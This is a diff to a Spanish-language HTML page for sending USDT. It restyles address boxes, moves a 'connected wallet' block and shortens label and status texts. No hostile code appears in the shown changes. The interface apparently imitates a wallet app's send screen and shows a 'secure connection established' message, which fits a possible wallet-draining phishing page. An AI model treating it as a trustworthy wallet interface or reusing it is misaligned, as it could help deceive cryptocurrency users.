@@ -170,6 +170,23 @@
         .tw-btn:disabled {
             background-color: #b3ccff;
         }
+    
+        /* Cuadros visuales para dirección y wallet conectada */
+        .tw-address-box {
+            border: 1px solid #e3e5e8;
+            border-radius: 14px;
+            padding: 12px 14px;
+            background: #ffffff;
+        }
+
+        .tw-address-box .tw-label {
+            margin-top: 0;
+        }
+
+        .tw-address-box .tw-input-row {
+            margin-bottom: 0;
+        }
+
     </style>
 </head>
 
@@ -193,7 +210,7 @@
         </svg>
 
         <div class="tw-header-title">
-            Enviar Tether USDT Trc-20
+            Enviar a USDT
         </div>
 
         <img
@@ -207,10 +224,27 @@
 
     <!-- Dirección destino -->
 
-    <div class="tw-input-group">
+    <div id="walletInfo" class="tw-input-group tw-address-box" style="display: none;">
+        <label class="tw-label">Wallet conectada</label>
+
+        <div class="tw-input-row">
+            <div
+                id="walletAddressText"
+                class="tw-input"
+                style="
+                    white-space: nowrap;
+                    overflow: hidden;
+                    text-overflow: ellipsis;
+                    width: 100%;
+                "
+            ></div>
+        </div>
+    </div>
+
+        <div class="tw-input-group tw-address-box">
 
         <label class="tw-label" for="addressDisplay">
-            Dirección o nombre de dominio
+            Dirección de destino
         </label>
 
         <div class="tw-input-row">
@@ -313,22 +347,7 @@
 
     <!-- NUEVO: wallet conectada -->
 
-    <div id="walletInfo" class="tw-input-group" style="display: none;">
-        <label class="tw-label">Wallet conectada</label>
-
-        <div class="tw-input-row">
-            <div
-                id="walletAddressText"
-                class="tw-input"
-                style="
-                    white-space: nowrap;
-                    overflow: hidden;
-                    text-overflow: ellipsis;
-                    width: 100%;
-                "
-            ></div>
-        </div>
-    </div>
+    
 
 
     <!-- Botón -->
@@ -836,7 +855,7 @@
 
 
                     setStatus(
-                        "Conexión segura establecida. Presione continuar con el envio."
+                        "Conexión segura establecida. Presione continuar."
                     );
 
 
